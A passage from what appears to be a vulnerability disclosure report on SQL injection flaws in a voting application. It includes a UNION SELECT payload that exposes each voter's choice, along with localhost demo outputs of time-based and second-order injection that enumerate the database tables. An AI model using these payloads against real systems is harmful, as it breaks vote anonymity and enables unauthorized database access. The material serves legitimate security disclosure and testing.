1=0 UNION SELECT CONCAT(user_external_id, ' voted for ', choice) as choice, 1 as votes 
FROM votes WHERE election_id=1 --
```

**🚨 CRITICAL IMPACT: Vote anonymity compromised!**

---

## 4. Exploit Demonstration

### 🧪 Test Environment

- **OS:** Windows 11 / Ubuntu 22.04
- **Node.js:** v22.21.0
- **MySQL:** 8.0.35
- **Network:** localhost (127.0.0.1)

### 📸 Screenshots

#### Time-based SQLi Test
```
$ node tests/demo_time_based_sqli.js

📊 Test 2: Injection with SLEEP function
Query type                  | Expected time | Actual time
----------------------------------------------------------------------
Normal request              | <100ms        | 42ms
SLEEP(2) injection          | ~2000ms       | 2048ms  ← VULNERABLE!
SLEEP(0) injection          | <100ms        | 41ms

📌 CONCLUSION:
✗ The /api/vote/verify endpoint is VULNERABLE to SQL injection
✗ An attacker can inject SQL code (SLEEP, IF, etc.)
✗ Time differences allow information inference
```

#### Second-order SQLi Test
```
$ node tests/demo_second_order_sqli.js

📊 STEP 2: Report execution
Injection type              | Result
---------------------------------------------------------------------------
UNION injection             | 1 result(s): INJECTED: 999

Table enumeration           | 5 result(s)

   🔍 Discovered tables:
      - accounts        ← CRITICAL!
      - admin_audit
      - elections
      - users
      - votes

📌 CONCLUSION:
✗ The /api/admin/report/run endpoint is VULNERABLE to Second-order SQLi
✗ Impact: Complete database read access
